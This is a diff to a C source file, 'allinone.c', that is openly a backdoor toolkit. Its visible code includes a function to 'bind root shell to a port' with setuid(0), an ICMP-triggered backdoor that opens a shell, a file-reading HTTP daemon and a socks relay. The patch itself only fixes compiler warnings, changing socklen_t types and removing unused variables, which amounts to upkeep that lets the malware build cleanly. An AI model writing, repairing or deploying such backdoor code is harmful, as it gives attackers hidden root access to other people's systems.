@@ -1,0 +1,122 @@
+diff --git a/src/allinone.c b/src/allinone.c
+index 781d4fd..ecadd4f 100644
+--- a/src/allinone.c
++++ b/src/allinone.c
+@@ -83,7 +83,8 @@
+ #include <unistd.h> 
+ #include <fcntl.h> 
+ #include <errno.h> 
+-
++#include <sys/types.h>
++#include <sys/stat.h>
+ 
+ #define HTTPD_PORT	8008 
+ #define BIND_PORT	8888 
+@@ -110,7 +111,7 @@
+ #define max(a, b) (a)>(b)?(a) : (b) 
+ 
+ int maxfd, infd, outfd; 
+-unsigned char ret_buf[32768]; 
++char ret_buf[32768]; 
+ 
+ int	daemon_init();		/* init the daemon, if success return 0 other <0 */ 
+ void	sig_chid();		/* wait the child die */ 
+@@ -134,9 +135,10 @@ void	plustospace();
+ /* The main function from here */ 
+ int main(int argc, char *argv[]) 
+ { 
+-	int fd, len, i, icmp; 
++	int fd, i; 
++	socklen_t len;
+ 	int csocket; 
+-	struct sockaddr_in caddr; 
++	struct sockaddr caddr; 
+ 	char readstr[4000]; 
+ 	char *cbuf; 
+ 	pid_t pid; 
+@@ -173,6 +175,7 @@ int main(int argc, char *argv[])
+ 			readstr [i] = '\0'; 
+ 			/*printf("Read from client: %s \n", readstr);*/ 
+ 			cbuf = read_file(readstr, csocket); 
++			printf("%s\n", cbuf);
+ 			close(csocket); 
+ 		} 
+ 		close(csocket); 
+@@ -475,12 +478,11 @@ ssize_t writen_file(int fd, const void *vptr, size_t n)
+ /* bind root shell to a port */ 
+ int bind_shell(int port) 
+ { 
+-	int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid, i, time; 
++	int soc_des, soc_cli, soc_rc, server_pid, i;
+ 	char passwd[15]; 
+ 
+ 	struct sockaddr_in serv_addr; 
+ 	struct sockaddr_in client_addr; 
+-	struct timeval testtime; 
+ 
+ 	setuid(0); 
+ 	setgid(0); 
+@@ -512,20 +514,22 @@ int bind_shell(int port)
+ 	if (soc_rc != 0) 
+ 		exit(0); 
+   
++	/*
++	struct timeval testtime; 
+ 	testtime.tv_sec = TIMEOUT; 
+ 	testtime.tv_usec = 0; 
+-
++    */
+ 	/*setsockopt(soc_des, SOL_SOCKET, SO_RCVTIMEO, &testtime, sizeof(testtime));*/ 
+ 
+ 	alarm(TIMEOUT); 
+-	soc_len = sizeof(client_addr); 
++	socklen_t soc_len = sizeof(client_addr); 
+ 	soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len); 
+ 
+ 	if (soc_cli < 0) 
+ 		exit(0); 
+ 	alarm(0); 
+ 
+-	cli_pid = getpid(); 
++	//cli_pid = getpid(); 
+ 	server_pid = fork(); 
+ 
+ 	if (server_pid != 0) 
+@@ -585,7 +589,8 @@ int get_shell(int fd)
+ /* icmp backdoor */ 
+ int icmp_shell() 
+ { 
+-	int i, s, size, fromlen, port = ICMP_PORT; 
++	int s, size, port = ICMP_PORT; 
++	socklen_t fromlen;
+ 	char pkt[4096]; 
+ 
+ 	struct protoent *proto; 
+@@ -604,7 +609,7 @@ int icmp_shell()
+ 		{ 
+ 			fromlen = sizeof(from); 
+ 			if((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *)&from, &fromlen)) < 0) 
+-			printf("", size - 28); 
++			printf("[%d]", size - 28); 
+ 		}while(size != SIZEPACK + 28); 
+ 
+ 		/* size == SIZEPACK, let's bind the shell on your port :)*/ 
+@@ -624,7 +629,8 @@ int icmp_shell()
+ /* tran socks code */ 
+ int socks(int listenp, char *targeth, int targetp) 
+ { 
+-	int listfd, outside, inside, size; 
++	int listfd;
++	socklen_t size;
+ 	pthread_t thread1; 
+ 	struct sockaddr_in client; 
+ 
+@@ -722,7 +728,7 @@ void out2in()
+ { 
+ 	struct timeval timeset; 
+ 	fd_set readfd, writefd; 
+-	int result, i = 0; 
++	int result;
+ 	char read_in1[MAXSIZE], send_out1[MAXSIZE]; 
+ 	char read_in2[MAXSIZE], send_out2[MAXSIZE]; 
+ 	int read1 = 0, totalread1 = 0, send1=0; 
